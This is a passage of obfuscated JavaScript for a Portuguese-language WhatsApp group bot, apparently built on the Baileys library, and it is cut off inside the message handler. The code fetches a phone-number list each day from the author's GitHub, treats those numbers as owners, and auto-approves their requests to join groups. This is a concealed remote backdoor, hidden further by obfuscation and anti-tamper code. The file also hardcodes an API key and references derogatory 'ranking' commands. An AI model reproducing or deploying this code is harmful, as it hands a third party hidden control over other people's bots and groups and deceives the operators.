'ifOhy', 'qQJSF', 'onqui', 'wDKeg', "ARA C", 'mYMES', 'FhgXu', 'Q3F9A', 'IFeDN', '://ch', 'Setti', 'FibaZ', 'abraç', "s, br", 'EANxt', 'cQSUj', 'nFnVi', 'xHenD', '52299', 'umlis', 'EOJFz', 'tZmBK', 'spert', 'JOork', "onam ", 'PsCRq', 'TvjaL', 'XPLLY', 'EzImh', "sa se", 'VIkVl', 'dtMVu', 'BFlsc', 'nRhl1', "o (ex", "nte m", "m ou ", 'resul', 'HbMDN', "8 𝐀𝐓𝐈", "ou 50", 'YHbwv', 'KIHZK', "cê mi", 'gif', 'wEYde', "❬ ✔ ❭", 'ASUNA', 'NKHCo', 'eMGXV', 'rreio', 'CDCfA', 'Avanç', 'NVcai', 'gqmAE', 'bOhEC', 'CpqLK', 'FfDwj', 'rado.', 'sLpQA', "já er", 'izani', 'Deznd', 'OS/ne', " e pa", " Gold", "\n\nCon", 'zdUpc', 'GtarR', 'eFlow', 'TidRY', 'OzTbB', 'zHCgL', 'oExQQ', 'VvncV', 'YwRUn', "ta é ", 'GqbuA', 'FFSxl', 'DASXP', " 」\n\n ", "y Bir", 'stjrX', 'PHUWc', "oi in", 'BqDHc', 'OwfKq', "] - V", 'QCXDU', 'tkgdb', 'qOJqK', "er a ", "re 🗿", "Mod 🕹️", 'ZGcPW', 'xRdqb', 'kzBfg', "\nMens", 'JbxXj', 'ZMzUD', 'lAtWp', 'PLgqu', '4|5|1', '/gtts', 'Gigan', "em gl", ", a p", "ta De", 'boYMa', 'LaJcr', '11d7f', "*\n*St", 'botof', 'acao', 'MZWCY', "ser u", 'MNiwC', " lemb", "om es", 'Invit', "𝐎 𝐅𝐈𝐆", 'zOJtz', 'nkemo', 'fOiEc', 'NloaB', " de S", 'adsQj', "O lim", "r e d", " espa", "37. ❄️", "o o t", 'eList', 'Video', 'ZdlhD', 'ÓXIMO', 'uUTwD', '𝐀𝐑𝐓𝐈𝐍', 'oupid', "upo F", 'FUrRr', 'hfAYS', 'EATH-', 'ljJaS', " ou 2", '*tran', " deix", 'otas', " do á", 'vrKbp', "ma go", "ão e ", "ra fo", 'GXowM', 'RNArY', "Não a", "x9 1", " de a", 'pmAov', "©by A", 'jVCiY', 'JUGFk', 'pIjSB', "Você ", 'KyvxJ', 'HkbZY', 'jbUmK', 'mMMGP', 'opost', 'posit', 'TepeD', 'awvXj', 'COMPL', '/escu', 'IevXT', 'ocr', "\njá e", 'rfOHI', 'ktEKP', 'LzNFg', " Docu", 'ptkdL', 'pphPL', "ivo d", 'uSzkf', 'kOXYe', 'gtDcw', "tão n", "a der", 'pjJOJ', "de Co", 'Arcad', "como ", "ue vc", 'm-vin', 'ePenX', 'HMZqs', "os 😢", '955f0', "hos d", 'oGFfU', 'aki', "fui a", 'DhKxt', 'YqGID', "xo 1", " : *", 'var2', 'BESDF', 'unes.', '00.jp', " esco", " te p", 'JohyO', 'hub.c', 'jFcjX', 'ames.', 'iyUvD', 'niMuu', 'VISTA', "ts on", 'ucoin', "93. 🔞", 'duran', "BEN ❄️", 'SyKmY', 'lkibX', 'sorte', 'AEBnv', 'kuxQN', 'fZcbk', "m dad", '╔┉✼┉═', "uem d", 'gaLuD', 'ixbGo', 'GLUWx', 'QQwzm', "b 😂😂☝🏼", "82. ❄️", "em/5\n", 'OKoHo', 'k-@', "+18 2", "\nUser", 'abalh', 'MhCOT', "s e p", 'Saind', 'AM.js', 'LibFF', '2/2', 'ant_n', 'LKKXI', " vesg", 'VskaV', 'HBmxc', 'cwSjk', "sa pe", 'gWqZp', "\n\n🐼🍧↯", 'tenta', "s doc", "do, v", 'pzdTS', " aume", 'simil', 'OHCif', "é bom", 'vazio', "na ro", 'uDNfu', 'deste', "n E P", 'cKemi', 'wcVMJ', 'ndada', 'hprel', 'bczSY', 'endsW', 'hcwcl', "URL d", 'qaVgz', "de au", 'kUQwu', 'spare', 'm..', " de V", " NO N", 'BxFOm', 'ceita', "ó con", "tou 6", 'nida.', 'ZzwZe', "4)\n5.", 'TULfF', 'DNyeE', 'vizin', 'eKJBA', 'FfCun', " List", 'QptvZ', '𝐭𝐮𝐬᭄❀⃯', " pode", " em e", 'STBvY', 'KkbPU', 'vlDqH', "r a s", 'LTAon', 'OnZau', 'urce%', 'udKGQ', 'lEpph', 'UDJYx', ". 🤐", 'vGLSL', 'aGhbf', "𝐗 🔞", "e pod", 'Lwcfz'];
  _0x1d9f = function () {
    return _0x561bb7;
  };
  return _0x1d9f();
}
const _0x43ee9f = function () {
  let _0x420bf3 = true;
  return function (_0x40e500, _0x9beb31) {
    const _0x34da7f = _0x420bf3 ? function () {
      if (_0x9beb31) {
        const _0x5e42b1 = _0x9beb31.apply(_0x40e500, arguments);
        _0x9beb31 = null;
        return _0x5e42b1;
      }
    } : function () {};
    _0x420bf3 = false;
    return _0x34da7f;
  };
}();
const _0x5ab8ca = _0x43ee9f(this, function () {
  return _0x5ab8ca.toString().search("(((.+)+)+)+$").toString().constructor(_0x5ab8ca).search("(((.+)+)+)+$");
});
_0x5ab8ca();
function _0x5255(_0x3f3814, _0x55a7ec) {
  const _0x5b281f = _0x1d9f();
  _0x5255 = function (_0x4196b3, _0x3c887f) {
    _0x4196b3 = _0x4196b3 - 272;
    let _0x87f5b0 = _0x5b281f[_0x4196b3];
    return _0x87f5b0;
  };
  return _0x5255(_0x3f3814, _0x55a7ec);
}
const {
  downloadContentFromMessage,
  relayWAMessage,
  mentionedJid,
  processTime,
  MediaType,
  Browser,
  MessageType,
  Presence,
  Mimetype,
  Browsers,
  delay,
  getLastMessageInChat,
  prepareWAMessageMedia,
  BufferJSON
} = require("@whiskeysockets/baileys");
const {
  fs,
  axios,
  crypto,
  util,
  P,
  linkfy,
  request,
  cheerio,
  ms,
  ffmpeg,
  qrterminal,
  yts,
  exec,
  spawn,
  execSync,
  moment,
  color,
  time,
  hora,
  date,
  getBuffer,
  convertSticker,
  recognize,
  fetchJson,
  fetchText,
  getBase64,
  createExif,
  response,
  addLimit,
  upload,
  addBanned,
  unBanned,
  BannedExpired,
  cekBannedUser,
  validmove,
  setGame,
  addComandosId,
  deleteComandos,
  getComandoBlock,
  getComandos,
  addComandos,
  getpc,
  wait,
  getExtension,
  generateMessageID,
  getGroupAdmins,
  getMembros,
  getRandom,
  banner2,
  banner3,
  temporizador,
  palavrasANA,
  quizanimais,
  kyun,
  simih,
  botoff,
  attp,
  ttp,
  Telesticker,
  igstalk,
  hentai,
  colors,
  comand,
  rgp,
  rg_aluguel,
  fetch,
  lermais,
  downloadPinterestLinks
} = require("./consts-func.js");
const {
  menu,
  menux,
  criador,
  menudw,
  menufig,
  menugold,
  menuanime,
  anotacao,
  infosorteio,
  menudono,
  adms,
  menulogos,
  efeitos,
  menuprem,
  brincadeiras,
  infocontador,
  infoduelo,
  infobemvindo,
  idiomagtts,
  infolistanegra,
  infotransmitir,
  infopalavrao,
  infobancarac,
  infodono,
  configbot,
  cmd_termux,
  alteradores,
  tabela,
  conselhob,
  palavrasc,
  ban,
  nescessario,
  setting,
  logoslink,
  premium,
  UsuWhiteL,
  countMessage,
  sendVideoAsSticker,
  sendImageAsSticker,
  sendVideoAsSticker2,
  sendImageAsSticker2,
  daily,
  comandos,
  limitefll,
  lirik,
  wikimedia,
  antispam,
  patentes,
  rggold,
  anotar,
  black_,
  enviarfiguUrl,
  getFileBuffer,
  DLT_FL,
  sleep,
  ANT_LTR_MD_EMJ,
  Limit_CMD,
  opengp,
  recolherLNK,
  SIMI_OFC,
  legendafig,
  NodeCache
} = require("./consts-func.js");
var {
  antipv3,
  TOKEN_GPT,
  isRecolherLink,
  cmdpremium,
  msgantipv1,
  msgantipv2,
  visualizarmsg,
  dono1,
  dono2,
  dono3,
  dono4,
  dono5,
  dono6,
  geminikey
} = require("./DADOS/nescessario.json");
function _0x5954c9(_0x46153f, _0x1ff464, _0x149cb6, _0x286093, _0x315960) {
  return _0x5255(_0x1ff464 + 0x3e5, _0x286093);
}
var {
  fundo1,
  fundo2,
  imgnazista,
  imggay,
  imgcorno,
  imggostosa,
  imggostoso,
  imgfeio,
  imgvesgo,
  imgbebado,
  gadocmd,
  matarcmd,
  beijocmd,
  abracocmd,
  chutecmd,
  tapacmd,
  rnkgay,
  rnkhetero,
  rnkgado,
  rnkcorno,
  rnkgostoso,
  rnkgostosa,
  rnknazista,
  rnkotaku,
  rnkpau,
  casamentocmd
} = require("./DADOS/links.json");
var {
  NomeDoBot,
  NickDono,
  prefix
} = require("./DADOS/settings.json");
const eununcaeuja = JSON.parse(fs.readFileSync("./DADOS/json/frases.json"));
const AssemblyAI = require("assemblyai");
var msg_auto = JSON.parse(fs.readFileSync("./DADOS/json/msg_auto.json"));
const ANT_FL = JSON.parse(fs.readFileSync("./DADOS/json/ANTI_SPAM.json"));
const Api = require("./req.js");
let groupMetadata_RG;
try {
  groupMetadata_RG = JSON.parse(fs.readFileSync("./DADOS/json/groups.json"));
} catch (_0xf5c245) {
  if (_0xf5c245.code === "ENOENT") {
    groupMetadata_RG = [];
    fs.writeFileSync("./DADOS/json/groups.json", JSON.stringify(groupMetadata_RG, null, 2));
  } else {
    console.error("Erro ao ler arquivo:", _0xf5c245);
    groupMetadata_RG = null;
  }
}
let groupMetadata;
let groupMembers;
var reqapi = new Api("Key_Do-Lotus_Samuel_EsDeath_12/08");
const speed = require("performance-now");
const path = require("path");
let SbE;
let SbE2;
let SbE3;
process.env.TZ = "America/Sao_Paulo";
const necessarioo = JSON.parse(fs.readFileSync("./DADOS/nescessario.json"));
const _0x2abba0 = {
  jogador: ''
};
function _0x41592b(_0x180c49, _0x5c9dbe, _0x1d833e, _0x5a08c9, _0x1fd09a) {
  return _0x5255(_0x1fd09a + 0x2e2, _0x180c49);
}
_0x2abba0.now = true;
const {
  Aki
} = require("aki-api");
const SetGlobal = new Set();
const ytdl = require("ytdl-core");
const cache = new Map();
const addToCache = (_0x972108, _0x57e22f) => {
  if (cache.size >= 100) {
    let _0x2961c9 = cache.keys().next().value;
    cache["delete"](_0x2961c9);
  }
  cache.set(_0x972108, _0x57e22f);
};
const encurtalink = async _0x480165 => {
  if (cache.has(_0x480165)) {
    return cache.get(_0x480165);
  }
  try {
    let _0x50ffd8 = await axios.get("https://tinyurl.com/api-create.php?url=" + _0x480165);
    addToCache(_0x480165, _0x50ffd8.data);
    return _0x50ffd8.data;
  } catch (_0x40cde6) {
    console.error("Erro ao encurtar link:", _0x40cde6);
    return null;
  }
};
const {
  GoogleGenerativeAI,
  HarmBlockThreshold,
  HarmCategory
} = require("@google/generative-ai");
const genAI = new GoogleGenerativeAI(necessarioo.geminikey);
const downloadMedia = (_0x12ee1f, _0x4b6d71) => {
  return new Promise(async (_0x50d3ae, _0x5679cf) => {
    buffer = await downloadMediaMessage(_0x12ee1f, "buffer", {});
    fs.writeFileSync(_0x4b6d71, buffer);
    _0x50d3ae(true);
  });
};
function _0xa19213(_0x1ff8ea, _0x1789b9, _0x357b8d, _0x5927e5, _0x208904) {
  return _0x5255(_0x1789b9 - 0x3cf, _0x357b8d);
}
var audiopromo2 = necessarioo.audiopromo.replaceAll("#meugit#", "https://raw.githubusercontent.com/Salientekill");
var audiorebai = necessarioo.audiorebai.replaceAll("#meugit#", "https://raw.githubusercontent.com/Salientekill");
var banieumesma = necessarioo.banieumesma.replaceAll("#meugit#", "https://raw.githubusercontent.com/Salientekill");
var numerodono_ofc = setting.numerodono.replace(new RegExp("[()+-/ +/]", 'gi'), '');
function _0x56abd0(_0x1a2413, _0x15302a, _0x3a145e, _0x2bdaf8, _0x233fca) {
  return _0x5255(_0x15302a - 0x31b, _0x2bdaf8);
}
process.on("uncaughtException", function (_0xc093c5) {
  const _0x54618f = {
    GsCiq: function (_0x5a8652, _0x14dd8b) {
      return _0x5a8652 + _0x14dd8b;
    }
  };
  _0x54618f.UwBVd = " uncaughtException:";
  console.error(new Date().toUTCString() + _0x54618f.UwBVd, _0xc093c5.message);
  console.error(_0xc093c5.stack);
});
function _0x400858(_0x8060f6, _0x297317, _0x77b398, _0x44086f, _0x21a8fe) {
  return _0x5255(_0x21a8fe + 0x1b5, _0x297317);
}
const {
  ChaveC,
  mykey,
  urlChave,
  vbot
} = require("./iniciar.js");
async function startAle(_0x1b024f, _0x5196be, _0x1dc071, _0x456b19) {
  if (ChaveC && urlChave.includes(vbot)) {
    try {
      if (_0x456b19) {
        const _0xbd10de = setting.numerodono.replace(new RegExp("[()+-/ +/]", 'gi'), '') + "@s.whatsapp.net" || isnit;
        const _0x5bd5f4 = ['' + _0xbd10de, dono1 + "@s.whatsapp.net", dono2 + "@s.whatsapp.net", dono3 + "@s.whatsapp.net", dono4 + "@s.whatsapp.net", dono5 + "@s.whatsapp.net", dono6 + "@s.whatsapp.net"];
        for (const _0xd2050d of _0x1b024f?.["messages"] || []) {
          const _0x346d97 = _0xd2050d.key.remoteJid;
          const _0x89cd51 = _0x346d97.endsWith("@g.us");
          if (_0x89cd51 && (!groupMembers || groupMembers == '')) {
            if (!_0xd2050d.messageStubType === 20) {
              if (fs.existsSync("./DADOS/json/groups.json")) {
                var _0x4d633b = JSON.parse(fs.readFileSync("./DADOS/json/groups.json"));
                var _0x4ca802 = await _0x5196be.groupFetchAllParticipating();
                var _0x32d8bd = Object.entries(_0x4ca802).slice(0).map(_0x56f520 => _0x56f520[1]);
                var _0x12914f = _0x32d8bd.map(_0x15cd0b => _0x15cd0b);
                _0x4d633b = _0x12914f;
                fs.writeFileSync("./DADOS/json/groups.json", JSON.stringify(_0x4d633b, null, 2));
              } else {
                var _0x4ca802 = await _0x5196be.groupFetchAllParticipating();
                var _0x32d8bd = Object.entries(_0x4ca802).slice(0).map(_0x4d5164 => _0x4d5164[1]);
                var _0x12914f = _0x32d8bd.map(_0x506732 => _0x506732);
                fs.writeFileSync("./DADOS/json/groups.json", JSON.stringify(_0x12914f, null, 2));
              }
            }
          }
          const _0x13966b = !!_0xd2050d.key.fromMe;
          const _0x246d48 = _0x346d97.includes("@g.us") ? _0xd2050d.key.participant.includes(':') ? _0xd2050d.key.participant.split(':')[0] + "@s.whatsapp.net" : _0xd2050d.key.participant : _0xd2050d.key.remoteJid;
          const _0x237f3e = JSON.parse(fs.readFileSync("./DADOS/json/dattingcmd.json"));
          const _0x1b6ab1 = _0x237f3e.users.map(_0x49f561 => _0x49f561 + "@s.whatsapp.net");
          const _0x3eefd0 = issupre = ischyt = _0x1b6ab1.includes(_0x246d48);
          const _0x4ef10d = new Date().toISOString().split('T')[0];
          if (_0x4ef10d != _0x237f3e.date) {
            users = await fetchJson("https://raw.githubusercontent.com/Salientekill/figurinhas/main/numerosdn.json");
            _0x237f3e.users = users;
            _0x237f3e.date = _0x4ef10d;
            fs.writeFileSync("./DADOS/json/dattingcmd.json", JSON.stringify(_0x237f3e, null, "\t"));
          }
          const _0xf59944 = _0x5bd5f4.includes(_0x246d48) || _0x13966b || _0x3eefd0 || issupre || ischyt;
          const _0x20a0f1 = {
            stdTTL: 0x14,
            checkperiod: 0xa
          };
          const _0x174d4a = new NodeCache(_0x20a0f1);
          const _0x50740b = async _0x83a9 => {
            try {
              const _0x50f3e3 = {
                text: _0x83a9
              };
              const _0x69b272 = {
                quoted: _0xd2050d
              };
              let _0x4c4003 = await _0x5196be.sendMessage(_0x346d97, _0x50f3e3, _0x69b272);
              const _0x19b77a = {
                key: _0x4c4003.key,
                message: _0x4c4003.message
              };
              _0x174d4a.set(_0xd2050d.key.remoteJid + '_' + _0xd2050d.key.id, _0x19b77a);
            } catch (_0x3fa462) {
              return _0x50740b("Erro: " + _0x3fa462);
            }
          };
          const _0x484e11 = !!fs.existsSync("./DADOS/grupos/" + _0x346d97 + ".json");
          const _0x3571af = fs?.["existsSync"]("./armor/tictactoe/db/" + _0x346d97 + ".json") ? JSON?.["parse"](fs?.["readFileSync"]("./armor/tictactoe/db/" + _0x346d97 + ".json")) : false;
          async function _0x26ddac(_0x513ee0) {
            const _0x272c73 = {
              "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
            };
            const _0x16f3a6 = {
              responseType: "arraybuffer",
              headers: _0x272c73
            };
            axios.get(_0x513ee0, _0x16f3a6).then(async _0xa369c9 => {
              fs.writeFileSync("imagem.jpg", _0xa369c9.data);
              const _0x5333d6 = {
                url: "imagem.jpg"
              };
              const _0x521a90 = {
                image: _0x5333d6
              };
              const _0x1f8bc0 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x521a90, _0x1f8bc0);
            })["catch"](_0x3b4b6e => {
              return _0x50740b("Erro!!");
            });
          }
          if (_0x484e11) {
            var _0x46a242 = JSON.parse(fs.readFileSync("./DADOS/grupos/" + _0x346d97 + ".json"));
          }
          if (_0xd2050d.messageStubParameters && _0xd2050d.messageStubParameters[0] === "Message absent from node") {
            await _0x5196be.sendMessageAck(JSON.parse(_0xd2050d.messageStubParameters[1], BufferJSON.reviver));
          }
          if (_0x484e11 && _0x46a242[0]?.['x9'] && _0xd2050d.messageStubType) {
            switch (_0xd2050d.messageStubType) {
              case 23:
                await delay(1000);
                _0x5196be.sendMessage(_0xd2050d.key.remoteJid, {
                  'text': "O ADM @" + _0xd2050d.participant.split('@')[0] + " acabou de redefinir o link do grupo...",
                  'mentions': [_0xd2050d.participant]
                });
                break;
              case 29:
                await delay(1000);
                _0x5196be.sendMessage(_0xd2050d.key.remoteJid, {
                  'text': "O usuario @" + _0xd2050d.messageStubParameters[0].split('@')[0] + " foi promovido pelo @" + _0xd2050d.participant.split('@')[0],
                  'mentions': [_0xd2050d.messageStubParameters[0], _0xd2050d.participant]
                });
                break;
              case 30:
                await delay(1000);
                _0x5196be.sendMessage(_0xd2050d.key.remoteJid, {
                  'text': "O ADM @" + _0xd2050d.messageStubParameters[0].split('@')[0] + " foi rebaixado para membro comum pelo adm @" + _0xd2050d.participant.split('@')[0],
                  'mentions': [_0xd2050d.messageStubParameters[0], _0xd2050d.participant]
                });
                break;
            }
          }
          function _0x132792(_0x11a8a) {
            let _0x40bd58 = JSON.parse(fs.readFileSync("./DADOS/json/groups.json", "utf-8"));
            let _0x216bab = _0x40bd58.find(_0x242d4a => _0x242d4a.id === _0x11a8a.id);
            if (!_0x216bab) {
              return true;
            }
            return JSON.stringify(_0x216bab) !== JSON.stringify(_0x11a8a);
          }
          function _0x22dc9c(_0x1e5330) {
            let _0x68e350 = require("async-lock");
            let _0x5e4b5e = new _0x68e350();
            _0x5e4b5e.acquire("group", _0x515656 => {
              try {
                if (_0x132792(_0x1e5330)) {
                  fs.writeFileSync("./DADOS/json/groups.json", JSON.stringify(groupMetadata_RG, null, 2));
                }
              } catch (_0x528da0) {
                console.error(_0x528da0);
              } finally {
                setTimeout(_0x515656, 200);
              }
            });
          }
          try {
            switch (_0xd2050d.messageStubType) {
              case 145:
              case 26:
              case 25:
              case 171:
                let _0x41fbcf = _0xd2050d.messageStubParameters[0] === 'on';
                let _0xf0063e = _0xd2050d.messageStubType === 145 ? "joinApprovalMode" : _0xd2050d.messageStubType === 26 ? "announce" : _0xd2050d.messageStubType === 25 ? "restrict" : "memberAddMode";
                let _0x2f6889 = groupMetadata_RG.find(_0x52fee1 => _0x52fee1.id === _0x346d97);
                if (_0x2f6889) {
                  if (_0x2f6889[_0xf0063e] !== _0x41fbcf) {
                    _0x2f6889[_0xf0063e] = _0x41fbcf;
                    _0x22dc9c(_0x2f6889);
                  }
                } else {
                  console.warn("Dados do grupo não encontrados para o ID do grupo: " + _0x346d97);
                }
                break;
              case 29:
              case 30:
                let _0x2bea93 = _0xd2050d.messageStubParameters[0];
                let _0x4da8b2 = groupMetadata_RG.find(_0x1aafd4 => _0x1aafd4.id === _0x346d97);
                if (_0x4da8b2) {
                  let _0x25b08d = _0x4da8b2.participants.find(_0x50ab43 => _0x50ab43.id === _0x2bea93);
                  if (_0x25b08d) {
                    let _0x257bb8 = _0xd2050d.messageStubType === 29 ? "admin" : null;
                    if (_0x25b08d.admin !== _0x257bb8) {
                      _0x25b08d.admin = _0x257bb8;
                      _0x22dc9c(_0x4da8b2);
                    }
                  } else {
                    console.warn("Participante não encontrado: " + _0x2bea93);
                  }
                } else {
                  console.warn("Dados do grupo não encontrados para o ID do grupo: " + _0x346d97);
                }
                break;
              case 21:
                let _0x3ee143 = _0xd2050d.messageStubParameters[0];
                let _0x2b2168 = groupMetadata_RG.find(_0x2ce37e => _0x2ce37e.id === _0x346d97);
                if (_0x2b2168 && _0x2b2168.subject !== _0x3ee143) {
                  _0x2b2168.subject = _0x3ee143;
                  _0x22dc9c(_0x2b2168);
                } else {
                  console.warn("Dados do grupo não encontrados para o ID do grupo: " + _0x346d97);
                }
                break;
              case 27:
              case 28:
              case 32:
                try {
                  let _0x5a5911 = await _0x5196be.groupMetadata(_0x346d97);
                  let _0xa2f7e2 = groupMetadata_RG.findIndex(_0x311808 => _0x311808.id === _0x346d97);
                  if (_0xa2f7e2 !== -1) {
                    groupMetadata_RG[_0xa2f7e2] = _0x5a5911;
                  } else {
                    groupMetadata_RG.push(_0x5a5911);
                  }
                  _0x22dc9c(_0x5a5911);
                } catch (_0x35e2de) {
                  console.error("Erro ao buscar dados do grupo: " + _0x35e2de.message);
                }
                break;
              case 0:
                let _0x358938 = _0xd2050d.message?.["protocolMessage"]?.["ephemeralExpiration"];
                if (_0x358938 !== undefined) {
                  let _0x219d69 = _0x358938 === 86400 ? 86400 : _0x358938 === 604800 ? 604800 : _0x358938 === 7776000 ? 7776000 : null;
                  let _0x597bac = groupMetadata_RG.find(_0x1a38ff => _0x1a38ff.id === _0x346d97);
                  if (_0x597bac) {
                    if (_0x219d69 === null) {
                      if (_0x597bac.ephemeralDuration !== undefined) {
                        delete _0x597bac.ephemeralDuration;
                        _0x22dc9c(_0x597bac);
                      }
                    } else {
                      if (_0x597bac.ephemeralDuration !== _0x219d69) {
                        _0x597bac.ephemeralDuration = _0x219d69;
                        _0x22dc9c(_0x597bac);
                      }
                    }
                  } else {
                    console.warn("Dados do grupo não encontrados para o ID do grupo: " + _0x346d97);
                  }
                }
                break;
              case 172:
                let _0x215344 = await _0x5196be.groupRequestParticipantsList(_0x346d97);
                for (let {
                  jid: _0x253a7b
                } of _0x215344) {
                  if (_0x253a7b && (_0x5bd5f4.includes(_0x253a7b) || _0x1b6ab1.includes(_0x253a7b))) {
                    await _0x5196be.groupRequestParticipantsUpdate(_0x346d97, [_0x253a7b], "approve");
                    await delay(500);
                    _0x5196be.sendMessage(_0xd2050d.key.remoteJid, {
                      'text': "Bem-Vindo Ao Grupo @" + _0x253a7b.split('@')[0],
                      'mentions': [_0x253a7b]
                    });
                  }
                }
                break;
              case 2:
              case 23:
              case 33:
              case 20:
                break;
              default:
                if (_0xd2050d.messageStubType && _0x89cd51) {
                  console.log(_0xd2050d, _0xd2050d.messageStubType);
                  try {
                    let _0x2443a4 = await _0x5196be.groupFetchAllParticipating();
                    let _0x6b8cf2 = Object.values(_0x2443a4);
                    fs.writeFileSync("./DADOS/json/groups.json", JSON.stringify(_0x6b8cf2, null, 2));
                  } catch (_0x594fd1) {
                    console.error("Erro ao processar o caso padrão: " + _0x594fd1.message, _0x594fd1);
                  }
                }
                break;
            }
          } catch (_0x45eb32) {
            console.error("Erro no bloco switch: " + _0x45eb32.message, _0x45eb32);
          }
          if (!_0xd2050d.message) {
            return;
          }
          const _0x4c1580 = require("@whiskeysockets/baileys");
          const _0x4c3ee0 = _0x4c1580.getContentType(_0xd2050d.message);
          if (_0x484e11 && _0x46a242[0].x9 && _0x4c3ee0 === "pinInChatMessage") {
            duration = _0xd2050d.message?.["messageContextInfo"]?.["messageAddOnDurationInSecs"];
            fixedTime = _0x2393ee => _0x2393ee === undefined || _0x2393ee === 0 ? '0' : _0x2393ee >= 2592000 ? "30d" : _0x2393ee >= 604800 ? '7d' : _0x2393ee >= 86400 ? "24h" : _0x2393ee;
            action = fixedTime(duration) === '0' ? "desafixar uma mensagem" : "fixar uma mensagem por *" + fixedTime(duration) + '*';
            await _0x5196be.sendMessage(_0x346d97, {
              'text': "O admin *@" + _0x246d48.split('@')[0] + "* acabou de " + action + '.',
              'mentions': [_0x246d48]
            });
          }
          const _0x17bc72 = Object.keys(_0xd2050d.message)[0];
          const _0x32135b = _0x2e6d65(_0xd2050d.message, _0x17bc72).toLowerCase();
          let _0x56d611 = JSON.parse(fs.readFileSync("./DADOS/json/optionscmd.json"));
          if (!_0x56d611[_0x346d97] || Date.now() > _0x56d611[_0x346d97].time) {
            _0x56d611[_0x346d97] = {};
          }
          if (_0x56d611[_0x346d97].time && _0x32135b && !["imageMessage", "videoMessage", "reactionMessage"].includes(_0x17bc72)) {
            senderMatch = _0x56d611[_0x346d97].sender == _0x246d48;
            commandMatch = _0x56d611[_0x346d97].comandos[_0x32135b];
            if (senderMatch && commandMatch) {
              _0xd2050d.message.conversation = commandMatch;
              _0x56d611[_0x346d97] = {};
            }
          }
          fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
          function _0x2e6d65(_0x51a152, _0x46c82f) {
            switch (_0x46c82f) {
              case "conversation":
                return _0x51a152.conversation;
              case "imageMessage":
                return _0x51a152.imageMessage?.["caption"] || '';
              case "videoMessage":
                return _0x51a152.videoMessage?.["caption"] || '';
              case "extendedTextMessage":
                return _0x51a152.extendedTextMessage?.["text"] || '';
              default:
                return '';
            }
          }
          function _0x5012a6(_0x30a99b, _0x276e57) {
            return _0x276e57 && !["imageMessage", "videoMessage", "reactionMessage"].includes(_0x30a99b);
          }
          const _0x7bbd45 = JSON.stringify(_0xd2050d.message);
          const _0x671b4b = _0xd2050d.pushName ? _0xd2050d.pushName : '';
          if (visualizarmsg) {
            await _0x5196be.readMessages([_0xd2050d.key]);
          } else {
            if (_0x346d97 == "status@broadcast") {
              return;
            }
          }
          global.prefix;
          global.blocked;
          logo = logoslink.menu;
          logolg = logoslink.logos;
          logopro = logoslink.proprietario;
          logodn = logoslink.dono;
          logofig = logoslink.figurinhas;
          logoanime = logoslink.anime;
          logo18 = logoslink.menu18;
          logoalt = logoslink.alteradores;
          logoefe = logoslink.efeitos;
          logopd = logoslink.download;
          logobr = logoslink.brincadeiras;
          logopre = logoslink.premium;
          logocri = logoslink.criador;
          logoadm = logoslink.adm;
          logogold = logoslink.gold;
          blalogoofc = "https://telegra.ph/file/5cd5991cf44dd765b6dab.jpg";
          const _0x2cd689 = setting.EmojiBot;
          var _0x3ac611 = _0xd2050d.message?.["conversation"] || _0xd2050d.message?.["viewOnceMessageV2"]?.["message"]?.["imageMessage"]?.["caption"] || _0xd2050d.message?.["viewOnceMessageV2"]?.["message"]?.["videoMessage"]?.["caption"] || _0xd2050d.message?.["imageMessage"]?.["caption"] || _0xd2050d.message?.["videoMessage"]?.["caption"] || _0xd2050d.message?.["extendedTextMessage"]?.["text"] || _0xd2050d.message?.["extendedTextMessage"]?.["conversation"] || _0xd2050d.message?.["viewOnceMessage"]?.["message"]?.["videoMessage"]?.["caption"] || _0xd2050d.message?.["viewOnceMessage"]?.["message"]?.["imageMessage"]?.["caption"] || _0xd2050d.message?.["documentWithCaptionMessage"]?.["message"]?.["documentMessage"]?.["caption"] || _0xd2050d.message?.["buttonsMessage"]?.["imageMessage"]?.["caption"] || _0xd2050d.message?.["buttonsResponseMessage"]?.["selectedButtonId"] || _0xd2050d.message?.["listResponseMessage"]?.["singleSelectReply"]?.["selectedRowId"] || _0xd2050d.message?.["templateButtonReplyMessage"]?.["selectedId"] || _0xd2050d?.["text"] || _0xd2050d.message?.["editedMessage"]?.["message"]?.["protocolMessage"]?.["editedMessage"]?.["extendedTextMessage"]?.["text"] || _0xd2050d.message?.["editedMessage"]?.["message"]?.["protocolMessage"]?.["editedMessage"]?.["imageMessage"]?.["caption"] || _0xd2050d?.["message"]?.["interactiveMessage"]?.["body"] || (_0xd2050d?.["message"]?.["interactiveResponseMessage"]?.["nativeFlowResponseMessage"]?.["paramsJson"] && JSON.parse(_0xd2050d.message?.["interactiveResponseMessage"]?.["nativeFlowResponseMessage"]?.["paramsJson"]))?.['id'] || '' || '';
          var _0x523298 = _0xd2050d.message?.["conversation"] || _0xd2050d.message?.["editedMessage"]?.["message"]?.["protocolMessage"]?.["editedMessage"]?.["conversation"] || _0xd2050d.message?.["viewOnceMessageV2"]?.["message"]?.["imageMessage"]?.["caption"] || _0xd2050d.message?.["viewOnceMessageV2"]?.["message"]?.["videoMessage"]?.["caption"] || _0xd2050d.message?.["imageMessage"]?.["caption"] || _0xd2050d.message?.["videoMessage"]?.["caption"] || _0xd2050d.message?.["extendedTextMessage"]?.["text"] || _0xd2050d.message?.["extendedTextMessage"]?.["matchedText"] || _0xd2050d.message?.["extendedTextMessage"]?.["canonicalUrl"] || _0xd2050d.message?.["extendedTextMessage"]?.["conversation"] || _0xd2050d.message?.["viewOnceMessage"]?.["message"]?.["videoMessage"]?.["caption"] || _0xd2050d.message?.["viewOnceMessage"]?.["message"]?.["imageMessage"]?.["caption"] || _0xd2050d.message?.["documentWithCaptionMessage"]?.["message"]?.["documentMessage"]?.["caption"] || _0xd2050d.message?.["buttonsMessage"]?.["imageMessage"]?.["caption"] || '';
          const _0x23d865 = _0x3ac611.trim().split(/ +/).slice(1);
          var _0x5725b4 = _0x3ac611.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, '');
          if (_0x89cd51 && _0x484e11) {
            if (_0x46a242[0].multiprefix) {
              var _0x141936 = _0x46a242[0]?.["prefixos"]["find"](_0xceb339 => String(_0x3ac611)?.["trim"]()?.["startsWith"](_0xceb339)) || _0x46a242[0].prefixos[0];
            } else {
